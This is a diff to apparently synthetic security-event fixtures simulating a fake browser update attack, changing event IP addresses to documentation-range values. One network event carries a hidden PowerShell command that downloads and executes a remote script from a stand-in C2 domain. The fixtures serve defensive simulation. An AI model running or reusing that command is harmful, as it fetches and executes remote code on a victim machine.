@@ -52,7 +52,7 @@ export function fakeBrowserUpdateScenarioEvents() {
       ...panWeb({
       ...cs, id: "evt_fbu_01_site_visit", ts: T(0), severity: "low",
       url: `https://${compromisedSite}/2026/06/port-congestion-outlook`, domain: compromisedSite,
-      category: "business-and-economy", action: "alert", dstIp: "104.21.45.118", status: 200, bytesIn: 148_320,
+      category: "business-and-economy", action: "alert", dstIp: "203.0.113.118", status: 200, bytesIn: 148_320,
       userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
       userTitle: "Logistics Coordinator",
       description: "LAP-4471 loaded an article page on logisticsweekly.com, allowed under the category business-and-economy.",
@@ -65,7 +65,7 @@ export function fakeBrowserUpdateScenarioEvents() {
     // 1b. Chrome resolves the staging host: the DNS lookup is attributed to the browser process.
     csDns({
       ...cs, id: "evt_fbu_01b_dns_staging", ts: T(1 * MIN + 11_000), severity: "low",
-      domain: stagingHost, resolvedIp: "38.180.29.140",
+      domain: stagingHost, resolvedIp: "203.0.113.143",
       processName: "chrome.exe", pid: 7244, processPath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
       parentName: "explorer.exe", parentPid: 3560,
       description: "chrome.exe on LAP-4471 resolved cdn-static-assets-92.net.",
@@ -75,7 +75,7 @@ export function fakeBrowserUpdateScenarioEvents() {
     panWeb({
       ...cs, id: "evt_fbu_02_overlay_fetch", ts: T(1 * MIN + 12_000), severity: "low",
       url: `https://${stagingHost}/loader/update-check.js`, domain: stagingHost,
-      category: "computer-and-internet-info", action: "alert", dstIp: "38.180.29.140", status: 200, bytesIn: 12_744,
+      category: "computer-and-internet-info", action: "alert", dstIp: "203.0.113.143", status: 200, bytesIn: 12_744,
       referer: `https://${compromisedSite}/2026/06/port-congestion-outlook`, mitre: "T1189", tactic: "Initial Access",
       description: "During the same page view, the browser session requested /loader/update-check.js from cdn-static-assets-92.net, referred by the logisticsweekly.com article.",
     }),
@@ -84,7 +84,7 @@ export function fakeBrowserUpdateScenarioEvents() {
     panWeb({
       ...cs, id: "evt_fbu_03_download", ts: T(3 * MIN + 40_000), severity: "medium",
       url: `https://${stagingHost}/download/Chrome_Update_127.0.6533.js`, domain: stagingHost,
-      category: "computer-and-internet-info", action: "alert", dstIp: "38.180.29.140", status: 200, bytesIn: 341_902,
+      category: "computer-and-internet-info", action: "alert", dstIp: "203.0.113.143", status: 200, bytesIn: 341_902,
       file: { name: "Chrome_Update_127.0.6533.js", path: "/download/Chrome_Update_127.0.6533.js", sha256: scriptHash, size: 341_902 },
       fileType: "script", mitre: "T1189", tactic: "Initial Access",
       description: "The same host then downloaded Chrome_Update_127.0.6533.js from cdn-static-assets-92.net over the same session.",
@@ -126,25 +126,25 @@ export function fakeBrowserUpdateScenarioEvents() {
     //     the powershell process (pid 9388) on the endpoint, before the perimeter refuses the URL.
     csDns({
       ...cs, id: "evt_fbu_06b_dns_c2", ts: T(5 * MIN + 11_400), severity: "medium",
-      domain: c2, resolvedIp: "176.97.76.18",
+      domain: c2, resolvedIp: "203.0.113.18",
       processName: "powershell.exe", pid: 9388, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       parentName: "wscript.exe", parentPid: 9312, sha256: powershellHash,
       description: "powershell.exe on LAP-4471 resolved api-telemetry-sync.com.",
     }),
     csNetwork({
       ...cs, id: "evt_fbu_06c_connect_c2", ts: T(5 * MIN + 11_800), severity: "medium",
-      remoteIp: "176.97.76.18", remotePort: 443, application: "tls", domain: c2,
+      remoteIp: "203.0.113.18", remotePort: 443, application: "tls", domain: c2,
       processName: "powershell.exe", pid: 9388, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       cmdline: "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://api-telemetry-sync.com/s/2')\"",
       parentName: "wscript.exe", parentPid: 9312, sha256: powershellHash,
-      description: "powershell.exe on LAP-4471 attempted an outbound connection to 176.97.76.18:443.",
+      description: "powershell.exe on LAP-4471 attempted an outbound connection to 203.0.113.18:443.",
     }),
 
     // 7. The second-stage fetch is refused at the perimeter (block-url).
     panWeb({
       ...cs, id: "evt_fbu_07_c2_blocked", ts: T(5 * MIN + 12_000), severity: "high",
       url: `https://${c2}/s/2`, domain: c2, category: "newly-registered-domain", action: "block",
-      dstIp: "176.97.76.18", status: 0, mitre: "T1105", tactic: "Command and Control",
+      dstIp: "203.0.113.18", status: 0, mitre: "T1105", tactic: "Command and Control",
       description: "The outbound request to api-telemetry-sync.com/s/2 was denied under the category newly-registered-domain.",
     }),
 
